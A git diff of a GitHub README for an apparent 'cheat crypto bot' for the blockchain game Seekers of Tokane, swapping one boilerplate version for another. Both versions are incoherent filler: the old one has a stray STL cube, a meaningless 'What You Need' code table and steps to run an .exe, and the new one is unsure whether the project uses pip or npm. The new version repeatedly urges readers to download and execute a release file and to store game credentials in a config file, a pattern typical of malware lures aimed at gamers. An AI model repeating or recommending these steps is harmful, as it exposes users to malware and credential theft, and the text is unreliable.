@@ -1,188 +1,136 @@
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+# Seekers of Tokane Cheat Crypto Bot
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+![Seekers of Tokane](https://img.shields.io/badge/Seekers%20of%20Tokane-Bot-green)
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
-  
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+Welcome to the **Seekers of Tokane Cheat Crypto Bot** repository! This project aims to enhance your gaming experience by automating farming and clicker activities in the popular blockchain game, Seekers of Tokane. The bot integrates seamlessly with cryptocurrency features and provides API support, making it a powerful tool for players looking to optimize their gameplay.
 
-## Read About
-Seekers of Tokane is an immersive roguelite JRPG in which you embark on a thrilling journey through diverse landscapes, each brimming with wondrous creatures known as Nefties. These magical beings are yours to collect, train, and trade as you navigate and battle your way through the universe of Aurory.Having strong Nefties will definitely help, but you will have to take much more into account than just Neftie rarity or level if you want to be victorious.Crystals and Prime or Standard eggs can be earned in the procedural lands, and sub-tokens that are converted to $AURY each week can be earned for ranked wins in PvP Blitz Battles with Prime Nefties.
+## Table of Contents
 
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+## Introduction
 
-![277](https://github.com/user-attachments/assets/02e0b935-7880-4605-886f-75726bf28703)
+In the ever-evolving world of blockchain games, efficiency is key. The **Seekers of Tokane Cheat Crypto Bot** is designed to automate various tasks, allowing you to focus on strategy and exploration. With features tailored for profit optimization and gameplay enhancement, this bot serves both casual players and serious gamers.
 
-https://github.com/user-attachments/assets/85fd9237-edee-40e8-8bfa-fa634a3a1c8d
+## Features
 
+- **Auto-Farming**: Automatically harvest resources and complete tasks.
+- **Clicker Automation**: Simplifies repetitive clicking activities.
+- **Crypto Integration**: Connects with various cryptocurrencies for in-game purchases and trades.
+- **API Support**: Offers robust API features for advanced users.
+- **Cheats and Hacks**: Implements strategies to maximize profits and enhance gameplay.
+- **User-Friendly Interface**: Easy to set up and use, even for beginners.
 
+## Installation
 
+To get started, follow these steps:
 
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
-```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
+1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- ROADMAP -->
-## Roadmap
-
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-<!-- GETTING STARTED -->
-## Getting Started
-
-### Prerequisites
-
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
-
-### Installation
-
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
+   ```bash
+   git clone https://github.com/RishikeshBharti/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack.git
    ```
-3. OR
 
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
+2. **Navigate to the Directory**: Change into the project directory.
 
-
-4. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
+   ```bash
+   cd Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack
    ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
+3. **Install Dependencies**: Install the required packages using pip or npm, depending on the technology stack.
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+   or
+
+   ```bash
+   npm install
+   ```
+
+4. **Download the Latest Release**: Visit the [Releases](https://github.com/RishikeshBharti/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases) section to download the latest version. Make sure to execute the downloaded file to start using the bot.
+
+## Usage
+
+Once you have installed the bot, follow these steps to start using it:
+
+1. **Configuration**: Open the configuration file and set your game credentials and preferences.
+2. **Launch the Bot**: Run the main script to start the bot.
+
+   ```bash
+   python main.py
+   ```
+
+3. **Monitor Performance**: Keep an eye on the bot’s performance and adjust settings as needed.
+
+### Example Configuration
+
+Here’s an example of what your configuration file might look like:
+
+```json
+{
+  "username": "your_username",
+  "password": "your_password",
+  "auto_farm": true,
+  "clicker_speed": "fast",
+  "crypto_integration": {
+    "enabled": true,
+    "currency": "ETH"
+  }
+}
 ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
-<!-- CONTRIBUTING -->
 ## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+We welcome contributions from the community! If you want to contribute, please follow these steps:
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+1. **Fork the Repository**: Click the fork button at the top right of this page.
+2. **Create a New Branch**: Use the following command to create a new branch.
 
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
 
-Not sure where to start? Join our discord and we will help you get started!
+3. **Make Changes**: Implement your changes and test them thoroughly.
+4. **Commit Your Changes**: Commit your changes with a clear message.
 
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
+   ```bash
+   git commit -m "Add new feature"
+   ```
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+5. **Push to Your Fork**: Push your changes to your forked repository.
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+
+6. **Open a Pull Request**: Navigate to the original repository and click on the "New Pull Request" button.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Email**: your_email@example.com
+- **GitHub**: [RishikeshBharti](https://github.com/RishikeshBharti)
+
+## Releases
+
+You can find the latest releases and updates for the bot [here](https://github.com/RishikeshBharti/Seekers-of-Tokane-Cheat-Crypto-Bot-Auto-Farm-Clicker-Game-Api-Hack/releases). Make sure to download the latest version and execute the file to enjoy the new features and improvements.
+
+## Conclusion
+
+The **Seekers of Tokane Cheat Crypto Bot** is a powerful tool designed to enhance your gaming experience. By automating tasks and integrating cryptocurrency features, it allows you to focus on strategy and enjoy the game to its fullest. We encourage you to explore the features and contribute to the project to make it even better.
+
+Thank you for visiting our repository! Happy gaming!
